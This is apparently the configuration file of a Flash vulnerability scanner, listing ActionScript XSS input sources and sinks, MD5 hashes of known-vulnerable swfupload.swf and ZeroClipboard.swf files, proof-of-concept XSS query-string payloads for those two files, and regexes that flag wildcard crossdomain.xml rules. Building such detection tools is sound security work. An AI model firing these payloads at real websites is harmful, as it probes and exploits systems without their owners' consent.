# coding=utf-8

# Flash XSS外部输入点
FLASH_XSS_SOURCE = [
    # AS2
    "_root.",

    # AS3
    "loaderInfo.parameters",
    "LoaderInfo(this.root.loaderInfo).parameters",
]

# Flash XSS漏洞触发点
FLASH_XSS_SINK = [
    "getURL",
    "URLRequest",
    "getURLBlankVar",
    "getURLParentVar",
    "getURLJSParam",
    "loadVariables",
    "loadMovie",
    "loadMovieVar",
    "loadMovieNum",
    "loadMovieNumVar",
    "FScrollPane.loadScrollContent",
    "LoadVars.load",
    "LoadVars.send",
    "XML.load",
    "XML.sendAndLoad",
    "Sound.loadSound",
    "NetStream.play",
    "ExternalInterface.call",
    "ExternalInterface.addCallback",
    "htmlText",
    "htmlVar",
    "navigateToURL",
    "loadClip",
    "addDLL",
]

# 已知存在Flash XSS漏洞的第三方swf文件的MD5收集，待补充
FLASH_XSS_MD5 = [
    {"swfupload.swf": "3a1c6cc728dddc258091a601f28a9c12"},
    {"ZeroClipboard.swf": "9f4401cdc4405d0730362256b4c04cc0"},

]

# 对应MD5库的swf文件的exp，待补充
FLASH_XSS_EXP = [
    {"swfupload.swf": "?movieName=\"])}catch(e){alert('mi1k7ea')};//"},
    {"ZeroClipboard.swf": "?id=\"))}catch(e){alert('mi1k7ea');}//&width=100&height=100"},

]

# Flash CSRF检测crossdomain.xml文件的正则
FLASH_CSRF_RULE = "<allow-access-from\s*domain=[\"|']\*[\"|']\s*/>"
GET_DOMAIN_VALUE = "<allow-access-from\s*domain=[\"|'](.*?)[\"|']\s*/>"

BANNER = r'''

        _|      _|  _|_|_|_|_|                _|    _|  _|
        _|_|  _|_|          _|              _|  _|  _|  _|
        _|  _|  _|        _|    _|_|_|_|_|  _|  _|  _|_|_|_|
        _|      _|      _|                  _|  _|      _|
        _|      _|    _|                      _|        _|  v1.0

'''